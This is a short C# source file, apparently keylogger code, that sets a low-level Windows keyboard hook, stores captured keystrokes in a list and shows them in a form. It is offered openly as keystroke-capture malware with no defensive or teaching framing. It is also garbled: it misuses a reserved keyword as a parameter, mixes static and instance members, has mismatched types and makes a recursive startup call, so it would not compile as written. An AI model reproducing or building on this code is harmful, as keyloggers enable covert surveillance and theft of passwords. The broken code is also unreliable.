```csharp
using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.IO;
using Win32Interop;

public class KeyLoggerForm : Form
{
    private readonly List<char> _logger = new List<char>();
    private readonly RichTextBox _output = new RichTextBox();
    private static Hook _keyboardHook;
    private static int _threadId = 0;
    private static bool _isHooked = false;

    public KeyLoggerForm()
    {
        InitializeComponent();
        if (!_isHooked)
        {
            _keyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookCallback);
            _isHooked = true;
        }
        _output.Dock = DockStyle.Fill;
        _output.KeyPress += _output_KeyPress;
        Start();
    }

    private static void KeyboardHookCallback(int nCode, IntPtr wParam, ref bool continue)
    {
        if (nCode == 0)
        {
            bool isKeyDown = (GetAsyncKeyState(wParam) & 0x1) != 0;
            if (isKeyDown)
            {
                Keys key = (char)wParam;
                _logger.Add(key);
            }
        }
        return (continue = false);
    }

    private static bool IsKeyDown(IntPtr wParam)
    {
        return GetAsyncKeyState(wParam) & 0x1;
    }

    private void _output_KeyPress(object sender, KeyEventArgs e)
    {
        foreach (char key in _logger)
        {
            _output.AppendText("[" + key + "] ");
        }
        _logger.Clear();
    }

    public static void Start()
    {
        Application.Run(new ApplicationContext(new KeyLoggerForm()));
    }

    public static void Stop()
    {
        if (_keyboardHook != IntPtr.Zero)
        {
            _keyboardHook = SetWindowsHook(0, null);
            _isHooked = false;
        }
    }

    private static int SetWindowsHook(int id, LowLevelKeyboardInputHandler handler)
    {
        return Win32Interop.SetWindowsHook(id, handler);
    }
}
